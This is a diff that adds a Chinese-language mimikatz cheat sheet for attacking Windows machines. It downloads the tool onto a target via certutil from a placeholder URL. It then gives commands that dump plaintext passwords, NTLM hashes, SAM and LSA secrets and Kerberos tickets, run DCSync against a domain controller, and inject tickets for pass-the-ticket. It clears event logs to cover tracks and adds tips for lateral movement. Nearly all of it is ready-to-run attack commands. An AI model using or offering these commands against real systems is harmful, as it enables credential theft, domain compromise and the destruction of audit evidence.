@@ -1,0 +1,53 @@
+kali内置，如果没有则需要自己安装一下
+>安装mimikatz
+sudo apt install mimikatz
+>复制一份到工具目录
+cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe $toolfile
+
+> 下载 mimikatz 到目标机
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+> 以管理员权限运行 mimikatz
+C:\windows\temp\$badfile
+> 提权（开启 debug 权限）
+privilege::debug
+> 导出当前内存中的明文密码（最常用）
+sekurlsa::logonpasswords
+> 导出 NTLM Hash
+sekurlsa::logonpasswords
+> 导出所有凭据（包含 kerberos）
+sekurlsa::tickets
+> dump SAM 数据库（需要 SYSTEM 权限）
+lsadump::sam
+> dump LSA Secrets（明文服务密码等）
+lsadump::secrets
+> DCSync（域控同步获取域用户 hash）
+lsadump::dcsync /user:Administrator
+> 导出票据（pass-the-ticket 用）
+kerberos::list /export
+> 注入票据（pass-the-ticket）
+kerberos::ptt ticket.kirbi
+> 清除日志（简单规避痕迹）
+event::clear
+
+###
+常见使用说明：
+1. 必须以管理员运行，否则大部分 sekurlsa 功能不可用
+2. 如果抓不到密码，可能是：
+   - 没有 debug 权限（需要 privilege::debug）
+   - 系统开启了 Credential Guard
+3. Windows 10/Server 2016+：
+   - 明文密码获取难度增加
+   - 建议结合：
+     sekurlsa::ekeys
+4. DCSync 使用条件：
+   - 当前用户需要具备域复制权限
+5. 横向移动常用组合：
+   - psexec + hash（pass-the-hash）
+   - kerberos::ptt（pass-the-ticket）
+常见报错：
+- ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+  → 权限不够 / 没开 debug
+建议搭配工具：
+- winPEAS（提权信息收集）
+- Rubeus（Kerberos 专项攻击）
+###
